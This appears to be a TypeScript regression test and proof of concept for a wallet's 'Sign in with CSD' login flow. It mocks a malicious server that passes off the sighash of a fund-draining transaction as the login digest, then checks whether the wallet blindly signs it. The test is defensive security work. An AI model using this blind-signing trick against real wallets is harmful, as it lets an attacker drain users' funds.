// ADVERSARIAL PoC — blind-signing oracle in the "Sign in with CSD" flow.
// Threat: the wallet's configured API (this.api) is malicious or MITM'd. The
// sign-in flow fetches a nonce AND a 32-byte `digest` from the server, then signs
// `digest` directly. If the wallet trusts the server's digest, the server can hand
// back the SIGHASH OF A TRANSACTION THAT DRAINS THE USER (it knows the victim's
// UTXOs — they're public) and the wallet returns a valid spend signature.
//
// Non-self-fulfilling: we build a real CSD drain tx, take its real codec sighash,
// feed it as the "login digest" via a mocked fetch, run the REAL wallet signIn,
// and check whether the signature it emits validly authorizes the drain tx.
//   VULNERABLE  → emitted sig verifies against the drain-tx sighash (theft).
//   SAFE        → it does not (wallet derived the login digest from the nonce),
//                 AND a legitimate login still verifies.
import { signIn } from "../src/core/node.js";
import { generate } from "../src/core/account.js";
import { sighash as codecSighash, verifySig, pubFromPriv, type Tx } from "../src/core/csdtx.js";
import { sha256 } from "@noble/hashes/sha256";
import { bytesToHex, utf8ToBytes } from "@noble/hashes/utils";

declare const process: { exit(code: number): void };
let pass = 0, fail = 0;
const check = (n: string, c: boolean) => { c ? (pass++, console.log("  ✅ " + n)) : (fail++, console.log("  ❌ " + n)); };

// The server's real login-digest scheme (single sha256 of "cairn-login:"+nonce).
const loginDigest = (nonce: string) => "0x" + bytesToHex(sha256(utf8ToBytes("cairn-login:" + nonce)));

const victim = generate();
const attacker = generate();
const NONCE = "a".repeat(48);

// A real drain tx: spend a (public) victim UTXO entirely to the attacker.
const drainTx: Tx = {
  version: 1, locktime: 0, app: { type: "None" },
  inputs: [{ prevTxid: "0x" + "11".repeat(32), vout: 0, scriptSig: "0x" }],
  outputs: [{ value: 100_000_000, scriptPubkey: attacker.addr }],
};
const drainSighash = codecSighash(drainTx); // what a malicious server would precompute

// Capture whatever signature the wallet emits to /auth/verify.
let emittedSig: string | null = null;
(globalThis as any).fetch = async (url: string, init?: any) => {
  const path = String(url);
  if (path.endsWith("/auth/nonce")) {
    // MALICIOUS: instead of loginDigest(nonce), hand back the drain-tx sighash.
    return { ok: true, json: async () => ({ ok: true, nonce: NONCE, digest: drainSighash }) };
  }
  if (path.endsWith("/auth/verify")) {
    emittedSig = JSON.parse(init.body).sig64;
    return { ok: true, json: async () => ({ ok: true, addr: victim.addr }) };
  }
  throw new Error("unexpected fetch " + path);
};

await signIn("https://malicious.example", victim.privkey);
const pub = pubFromPriv(victim.privkey);

console.log("PoC: malicious API returns a drain-tx sighash as the 'login digest'\n");
const drainSigValid = !!emittedSig && verifySig(emittedSig, pub, drainSighash);
check("wallet does NOT emit a signature that authorizes the attacker's drain tx", !drainSigValid);
check("the emitted signature is a VALID login (matches locally-derived login digest)",
  !!emittedSig && verifySig(emittedSig, pub, loginDigest(NONCE)));

if (drainSigValid) console.log("\n  ⚠️  VULNERABLE: emitted signature spends the victim's coins to the attacker.");
console.log(`\n${fail === 0 ? "SAFE" : "VULNERABLE"}: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
